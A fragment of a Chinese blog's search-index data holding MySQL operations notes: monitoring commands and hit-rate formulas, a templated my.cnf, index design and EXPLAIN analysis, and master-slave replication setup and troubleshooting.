","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:9:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mysql进程监控 ps -ef | grep \"mysqld_safe\" | grep -v \"grep\" ps -ef | grep \"mysqld\" | grep -v \"mysqld_safe\"| grep -v \"grep\" ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:10:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"查看当前数据库的状态 mysql -u root -ppwd -e 'show status' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:11:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mysqlcheck 工具程序可以检查(check),修 复( repair),分 析( analyze)和优化(optimize)MySQL Server 中的表 mysqlcheck -u root -ppwd --all-databases ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:12:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mysql qps查询 QPS = Questions(or Queries) / Seconds mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Questions\"' mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Queries\"' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:13:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mysql Key Buffer 命中率 key_buffer_read_hits = (1 - Key_reads / Key_read_requests) * 100% key_buffer_write_hits= (1 - Key_writes / Key_write_requests) * 100% mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Key%\"' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:14:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mysql Innodb Buffer 命中率 innodb_buffer_read_hits=(1-Innodb_buffer_pool_reads/Innodb_buffer_pool_read_requests) * 100% mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Innodb_buffer_pool_read%\"' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:15:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mysql Query Cache 命中率 Query_cache_hits= (Qcache_hits / (Qcache_hits + Qcache_inserts)) * 100% mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Qcache%\"' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:16:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mysql Table Cache 状态量 mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Open%\"' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:17:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mysql Thread Cache 命中率 Thread_cache_hits = (1 - Threads_created / Connections) * 100% 正常来说,Thread Cache 命中率要在 90% 以上才算比较合理。 mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Thread%\"' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:18:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mysql 锁定状态:锁定状态包括表锁和行锁两种,我们可以通过系统状态变量获得锁定总次数,锁定造成其他线程等待的次数,以及锁定等待时间信息 mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"%lock%\"' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:19:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mysql 复制延时量 在slave节点执行 mysql -u root -ppwd -e 'SHOW SLAVE STATUS' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:20:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mysql Tmp table 状况 Tmp Table 的状况主要是用于监控 MySQL 使用临时表的量是否过多,是否有临时表过大而不得不从内存中换出到磁盘文件上 mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Created_tmp%\"' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:21:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mysql Binlog Cache 使用状况:Binlog Cache 用于存放还未写入磁盘的 Binlog 信 息 。 mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Binlog_cache%\"' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:22:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mysql nnodb_log_waits 量:Innodb_log_waits 状态变量直接反应出 Innodb Log Buffer 空间不足造成等待的次数 mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Innodb_log_waits' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:23:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"Mysql配置文件","date":"2022-06-24","objectID":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/","tags":["linux","mysql"],"title":"Mysql配置文件","uri":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"修改配置文件(默认的/etc/my.cnf是mariadb的) https://blog.51cto.com/moerjinrong/2092791 参数优先级: 命令行参数指定 \u003e 配置文件 my.cnf(指定配置文件\u003e数据目录下的配置文件\u003eetc下的配置文件) \u003e 默认参数 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/:1:0","tags":["linux","mysql"],"title":"Mysql配置文件","uri":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"标签配置分类 标签用某个特定的标签值来表示以下内容针对于某个程序(命令)体现的,一般可分文[client]、[server]两大类 [client]: 针对全部客户端 [mysql]: 标签下内容针对mysql这个程序(命令)来设置的 [mysqladmin]: … [mysqldump]: … [server]: 针对全部服务端 [mysqld_safe]: 标签下内容针对mysqld_safe这个程序(命令)来设置的( mysqld_safe是用来管理mysqld的一个进程，其增加了一些安全特性 ) [mysqld]: 标签下内容针对mysqld这个程序(命令)来设置的 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/:2:0","tags":["linux","mysql"],"title":"Mysql配置文件","uri":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"配置文件示例(ansible初始化示例) 注意配置文件每行后不能有空格,需直接换行 ; 目录结构 ; mysqldb ; └── 3306 ; ├── binlog ; ├── data ; ├── logs ; ├── relaylog ; └── tmp [client] port={{ MYSQL_PORT|default(3306) }} default-character-set = utf8 socket = {{ DATA_ROOT }}/mysql.sock ; prompt = '\\u@\\h [\\d] \u003e\\_' [mysqld] port={{ MYSQL_PORT|default(3306) }} bind-address = 0.0.0.0 character-set-server = utf8 collation-server = utf8_general_ci socket = {{ DATA_ROOT }}/mysql.sock pid-file = {{ DATA_ROOT }}/mysql.pid ; 二进制安装配置 basedir = {{ BASEDIR }} datadir = {{ DATA_ROOT }}/data tmpdir = {{ DATA_ROOT }}/tmp ; 存在大量提交时建议关闭提交(默认开启) autocommit=on ; 第一个ibdata 必定是一个固定大小的，若在启动后修改，则需要设置与实际大小一致，不能多也不能少，第二个则不受限制(默认是下12M) innodb_data_file_path=ibdata1:512M;ibdata2:512M:autoextend ; 常规日志，记录所有成功的语句(默认关闭,不建议开启) general_log=off general_log_file={{ DATA_ROOT }}/logs/server2.log ; 错误日志,记录数据库的一般状态及报错信息,是我们对于数据库常规报错处理的常用日志 log-error={{ DATA_ROOT }}/logs/mysqld.log ; 禁用dns解析(只能使用ip) skip-name-resolve ; 二进制日志控制 start ; 建议设置全备+1天 ; expire_logs_days = 8 ; 各个节点不一样 server_id = {{ 65535 |random(1,9) }} ; sync_binlog 为1时, 每次提交都会向磁盘中写入数据(bin-log目录最好和数据目录分开),最安全但是性能损耗最大,不建议开启 sync_binlog=0 master_info_repository=TABLE log-bin = {{ DATA_ROOT }}/binlog/mysql-bin binlog_format = row ; 关闭relay_log 自动清理功能 relay_log_purge = 0 relay_log_info_repository=TABLE relay-log = {{ DATA_ROOT }}/relaylog/mysql-relay-bin ; 主从同步重连时间(默认3600s)，从库多长时间未收到主库传来的Binary Logs events后从而判定超时,slaveIO线程重连,越频繁建议设置越小 slave_net_timeout = 5 ; 启用GTID,不启用则为普通复制(单节点开启无意义) gtid-mode=on ; 强制GTID的一致性 enforce-gtid-consistency=true ; slave更新是否记录日志 (多主环境必加) log-slave-updates=1 ; 二进制日志控制 end ; 打开并记录慢日志 slow_query_log = OFF slow_query_log_file = {{ DATA_ROOT }}/logs/slow.log ; 设定超过多少时间(s)的sql会被记录,一般不会超过1秒 long_query_time = 0.5 ; 不使用索引的慢查询日志是否记录到索引 log_queries_not_using_indexes = on ; 查询结果小于多少行的将不会记录,此参数需要参考者设置 ; min_examined_row_limit=100 ; mysql 优化 start open_files_limit = 65535 ; mysql 优化 end [mysqldump] quick max_allowed_packet = 128M ; mysqldump -uroot -p -A -R --triggers --master-data=2 --single-transaction|gzip \u003e /backup/all_$(date +\"%F-%T\").sql.gz ; ignore-table=database.table ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/:3:0","tags":["linux","mysql"],"title":"Mysql配置文件","uri":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"Mysql优化","date":"2022-06-24","objectID":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/","tags":["linux","mysql"],"title":"Mysql优化","uri":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"1. Mysql 优化 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/:1:0","tags":["linux","mysql"],"title":"Mysql优化","uri":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"1.1. 索引优化 索引的种类 B树(b-tree B+tree B*tree); R树; Hash索引 全文索引 B树索引的类型 聚簇索引(cluster index): 一般是基于主键的,自动生成,一般是建表时创建 辅助索引(普通索引:回表查询; 覆盖索引: 不回表查询): 认为创建(普通型,覆盖型) 唯一键索引: 认为创建 作用 在数据库中,索引是用来优化查询的. 排除缓存之外,数据的查询: 1. 全表扫描; 2. 索引扫描 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/:2:0","tags":["linux","mysql"],"title":"Mysql优化","uri":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"1.1.1. 索引分类 主键索引 --- 创建主键索引(推荐) create table `\u003ctable_name\u003e` ( `id` int(4) not null auto_increment, `name` char(20) not null, primary key (`id`) ) engine=innodb default charset=utf8 --- 创建主键索引 create table `\u003ctable_name\u003e` ( `id` int(4) not null, `name` char(20) not null ) engine=innodb default charset=utf8 alter table \u003ctable_name\u003e change id id int(4) primary key not null auto_increment 普通索引(MUL) --- 创建索引 mysql\u003e alter table \u003ctable_name\u003e add index \u003cindex_name\u003e(\u003ccolumn_name\u003e); # create index \u003cindex_name\u003e on \u003ctable_name\u003e(\u003ccolumn_name\u003e); --- 删除索引 mysql\u003e alter table \u003ctable_name\u003e drop index \u003cindex_name\u003e; # drop index \u003cindex_name\u003e on \u003ctable_name\u003e; --- 查看索引信息 mysql\u003e show index from \u003ctable_name\u003e; 唯一索引 mysql\u003e create unique index \u003cindex_name\u003e on \u003ctable_name\u003e(\u003ccolumn_name\u003e) 前缀索引 --- create index idx_phoneNum on phone(phoneNum(3)) mysql\u003e create index \u003cindex_name\u003e on \u003ctable_name\u003e(\u003ccolumn_name\u003e(\u003clength\u003e)) 联合索引 # index(a,b,c) # a, ab, abc ,ac 走索引, 其他关联查询均不走索引(如 b,bc,c ) mysql\u003e alter table \u003ctable_name\u003e add index \u003cindex_name\u003e(\u003ccloumn_name1\u003e,\u003ccloumn_name2\u003e,\u003ccloumn_name3\u003e) ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/:2:1","tags":["linux","mysql"],"title":"Mysql优化","uri":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"1.1.2. 查看某个语句在查询时是否使用了索引,使用了那些索引 mysql\u003e explain select * from world.city where Name = 'Chongqing'\\G ***************************[ 1. row ]*************************** id | 1 select_type | SIMPLE table | city type | ref possible_keys | idx_name key | idx_name key_len | 35 ref | const rows | 1 Extra | Using index condition -- type: 表示mysql在表中找到所需行的方式,又称\"访问类型\" --- 常见类型有: ALL,index,range,ref,eq_ref, const,system, NULL 从左到又,性能从差到好 --- ALL: 全表扫描,未使用索引查询(1. 语句写的有问题, 2. 索引问题) --- index: 全索引扫描 ---- explain select count(*) from city ; --- range: 范围扫描, 关键字包含 \u003e、\u003c、\u003e=、\u003c=、between...and、in()、or、like 'x%' ---- explain select * from city where `CountryCode` like 'CH%' --- ref: 使用非唯一索引(即非主键或唯一索引)扫描或者唯一的前缀扫描，返回匹配某个单独值的记录行 ---- explain select * from city where Name = 'Chongqing' --- eq_ref: 类似ref，区别就是在使用的索引是唯一索引，对于每个索引键值，表中只有一条记录匹配(join条件使用的是primary key 或者 unique key) --- const、system: 将组件设置为where 的条件 ---- explain select * from city where id = 1; --- NULL: -------- -- key_len: 代表索引长度，若索引长度较长，可以将其替换为前缀索引 -- Extra: 相当于一个描述吧 --- 当出现 Using temporary; Using filesort; Using join buffer 时候，一般代表涉及到排序操作时部分数据可能未走索引，因此导致性能问题。 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/:2:2","tags":["linux","mysql"],"title":"Mysql优化","uri":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"1.1.3. 索引设计的原则 为了使索引的使用效率更高，在创建索引时，必须考虑在哪些字段上创建索引和创建什么类型的索引。 那么索引设计原则又是怎样的? 1.1.3.1. 运维规范 选择唯一性索引(重点关注) 唯一性索引的值是唯一的，可以更快速的通过该索引来确定某条记录。例如，学生表中学号是具有唯一性的字段。为该字段建立唯一性索引可以很快的确定某个学生的信息。 如果使用姓名的话，可能存在同名现象，从而降低查询速度。主键索引和唯一键索引，在查询中使用是效率最高的。 为经常需要排序、分组和联合操作的字段建立索引(重点关注) 经常需要ORDER BY、GROUP BY、DISTINCT和UNION等操作的字段，排序操作会浪费很多时间。 如果为其建立索引，可以有效地避免排序操作。 为常作为查询条件的字段建立索引(重点关注) 如果某个字段经常用来做查询条件，那么该字段的查询速度会影响整个表的查询速度。因此，为这样的字段建立索引，可以提高整个表的查询速度。 尽量使用前缀来索引(重点关注) 如果索引字段的值很长，最好使用值的前缀来索引。例如，TEXT和BLOG类型的字段，进行全文检索会很浪费时间。如果只检索字段的前面的若干个字符，这样可以提高检索速度。 限制索引的数目 索引的数目不是越多越好。每个索引都需要占用磁盘空间，索引越多，需要的磁盘空间就越大(查询是IO消耗大)。修改表时，对索引的重构和更新很麻烦。越多的索引，会使更新表变得很浪费时间。 尽量使用数据量少的索引 如果索引的值很长，那么查询的速度会受到影响。例如，对一个CHAR（100）类型的字段进行全文检索需要的时间肯定要比对CHAR（10）类型的字段需要的时间要多。 删除不再使用或者很少使用的索引 表中的数据被大量更新，或者数据的使用方式被改变后，原有的一些索引可能不再需要。数据库管理员应当定期找出这些索引，将它们删除，从而减少索引对更新操作的影响。 1.1.3.2. 开发规范(草稿) 不走索引的情况： 重点关注： 没有查询条件，或者查询条件没有建立索引 select * from tab; 全表扫描。 select * from tab where 1=1; 在业务数据库中，特别是数据量比较大的表。 是没有全表扫描这种需求。 对用户查看是非常痛苦的。 对服务器来讲毁灭性的。 select * from tab; SQL改写成以下语句： selec * from tab order by price limit 10 # 需要在price列上建立索引 select * from tab where name='zhangsan' # name列没有索引 改： 换成有索引的列作为查询条件 将name列建立索引 查询结果集是原表中的大部分数据，应该是30％以上。 查询的结果集，超过了总数行数30%，优化器觉得就没有必要走索引了。 假如：tab表 id，name id:1-100w ，id列有索引 select * from tab where id\u003e500000; 如果业务允许，可以使用limit控制。 怎么改写 ？ 结合业务判断，有没有更好的方式。如果没有更好的改写方案 尽量不要在mysql存放这个数据了。放到redis里面。 索引本身失效，统计数据不真实 索引有自我维护的能力。 对于表内容变化比较频繁的情况下，有可能会出现索引失效。 查询条件使用函数在索引列上，或者对索引列进行运算，运算包括(+，-，*，/，! 等) 例子： 错误的例子：select * from test where id-1=9; 正确的例子：select * from test where id=10; 隐式转换导致索引失效.这一点应当引起重视.也是开发中经常会犯的错误. 由于表的字段tu_mdn定义为varchar2(20),但在查询时把该字段作为number类型以where条件传给数据库, 这样会导致索引失效. 错误的例子：select * from test where tu_mdn=13333333333; 正确的例子：select * from test where tu_mdn='13333333333'; ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/:2:3","tags":["linux","mysql"],"title":"Mysql优化","uri":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"Mysql主从复制","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"1. 前提 需要多个实例 每台实例server_id不同 需要开启二进制日志 主库需要提供复制相关的用户权限(replication slave) 从库需要将和主库相差的数据进行追加,一般先备份主库数据恢复到从库,然后在进行同步 从库应该从恢复之后的时间点开始自动从主库获取最新的二进制日志 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:1:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"2. 复制中的线程 主库 Dump thread: 在复制过程中,主库发送二进制日志的线程 binlog文件 : 主库的二进制文件 从库 IO thread : 向主库请求二进制日志,并接收二进制日志的线程 SQL thread : 执行请求过来的二进制的线程 relaylog : 中继日志,存储请求过来的二进制日志 master.info: 从库连接主库的重要参数(user,passwd,ip,port);上次获取过的主库的二进制日志位置 relay-log.info: 存储从库SQL线程已经执行过的relaylog日志位置 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:2:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"3. 主从复制原理 从库通过IO线程,读取master.info中的信息,获取到连接及上次请求主库的binlog的位置,然后IO线程使用获取到的连接连接到主库,主库获取到从库发来的位置信息和现有二进制日志进行对比,如果有新二进制日志,会通过dump thread发送给相关信息给从库,从库通过IO线程,接受主库发来的二进制日志后,存储到TCP/IP缓存中,并返回ACK确认给主库,主库收到ACK后,就认为任务复制完成了,可以继续其他工作。从库此时将更新master.info的二进制位置信息,IO线程会将TCP/IP缓存中的日志，会存储到relay-log日志文件中。然后SQL线程读取relay-log.info上次执行到的日志位置(此位置信息不一定与binlog日志位置相同),以这个日志位置为起点继续执行relay-log日志。SQL线程执行完成所有relay之后，会更新relay-log.info信息为新的位置信息。（至此一次复制完成） ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:3:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4. 主从复制实践 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:4:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.1. my.cnf # 禁用dns解析(只能使用ip) skip-name-resolve # 二进制日志控制 server_id = 10 # 每个节点id不同 log-bin = /data/mysql57/3307/binlog/mysql-bin binlog_format = row ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:5:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.2. 备份 $\u003e mysqldump --defaults-file=/data/mysql57/3307/etc/my.cnf -A -R -B --triggers --master-data=2 --single-transaction \u003e /tmp/aa.sql $\u003e sed -n '22p' /tmp/aa.sql -- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000004', MASTER_LOG_POS=596; ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:6:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.3. 授权 $\u003e grant replication slave on *.* to repl@'10.0.2.%' identified by 'gC74lgK9sSkzwBbrztd3'; $\u003e flush privileges; ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:7:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.4. 备库导入数据 $\u003e mysql \u003c /tmp/aa.sql ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:8:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.5. 备库指定与主库的同步信息并启动同步 --- 指定同步连接信息(从库) mysql\u003e change master to MASTER_HOST='10.0.2.25', MASTER_USER='repl', MASTER_PASSWORD='gC74lgK9sSkzwBbrztd3', MASTER_PORT=3307, MASTER_LOG_FILE='mysql-bin.000004', MASTER_LOG_POS=596, MASTER_CONNECT_RETRY=3; --- 若初次搭建则(或从0开始全同步) mysql\u003e change master to MASTER_HOST='10.0.2.25', MASTER_USER='repl', MASTER_PASSWORD='gC74lgK9sSkzwBbrztd3', MASTER_PORT=3307, MASTER_AUTO_POSITION=1; --- 启动同步 mysql\u003e start slave --- 查看启动状态 mysql\u003e show slave status\\G ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:9:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.6. 主从状态信息介绍 mysql\u003e show slave status\\G Slave_IO_Running | Yes Slave_SQL_Running | Yes ## 最后一次IO的错误号码 Last_IO_Errno | 0 ## 最后一次IO的错误信息 Last_IO_Error | ## 最后一次SQL的错误号码 Last_SQL_Errno | 0 ## 最后一次SQL的错误信息 Last_SQL_Error | ## 从库(同步)落后于主库的秒数 Seconds_Behind_Master | 0 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:10:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.6.1. IO线程故障 主库连接不上: 防火墙、网络、连接信息错误(ip、passwd、port、user)、域名解析(skip-name-resolve) 解决方案: mysql\u003e stop slave; mysql\u003e reset slave all; mysql\u003e change master to ....; mysql\u003e start slave; 主库二进制日志文件丢失或损坏 解决方案: 重新备份恢复，在重新构建主从 4.6.1.1. 案例1 主从同步出现IO故障。导致原因，主库修改了端口号 解决方案: 从库 slow slave status\\G，确认故障 记录Master_Log_File和Read_Master_Log_Pos值 stop slave reset slave all change master to ... start slave 4.6.1.2. 案例2 主库的二进制日志被清理(1.reset master;2.binlog文件找不到/损坏/断节/物理删除/名字被修改等),从库请求日志出现Slave_IO_Running: No(Last_IO_Error: xxxx could not find next log;the first evnet 'mysql-bin.xxxxx') 解决方案: 使用备份恢复，重新初始化主从 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:10:1","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.6.2. SQL 线程故障 执行replaylog日志新事件时,比如增加、删除库或数据时，从库已经存在或已经丢失了将要操作的数据 解决方案: ## 1. 直接重建主从同步(推荐) ## 2. 一切以主库为准，创建失败时候删除从库多余的重启同步即可 ## 3. 执行忽略操作(此操作有一定风险，出非明确知道在干什么，否则不建议使用) mysql\u003e stop slave; mysql\u003e set global sql_slave_skip_counter = 1; ## 将同步移动至下一个操作，如果多次不同步，可重复操作此项 mysql\u003e start slave; ## 4. 同3,只是在配置文件中忽略对应编码 $\u003e vim my.cnf slave-skip-errors = 1032,1062,1007 ## 5. 为防止SQL线程故障，一般会设置从库只读(只针对普通用户) mysql\u003e set global read_only=1; ## $\u003e my.cnf: read_only=1 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:10:2","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.7. 延迟同步(故障) show slave status\\G Seconds_Behind_Master: 主从延时时间(s) ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:11:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.7.1. 如何避免延迟同步 sync_binlog=1,0(默认):事务提交不立即写入磁盘，靠操作系统判断什么时候写入;1:每次提交事务都立即刷新binlong到磁盘; 主库大事务很多，拆分为小事务,多事务隔离 主库并发事务很多，使用多(sql)线程复制，针对不同库的事务来进行并发(有局限性) 使用多级主从，分库分表架构 将binlog|relaylog放到高性能(ssd)磁盘上 主备硬件尽量一致 从库越多，压力越大(dump 线程压力越大) sql 线程慢 默认只有一个sql线程，从库中的事务都是一个一个来执行的 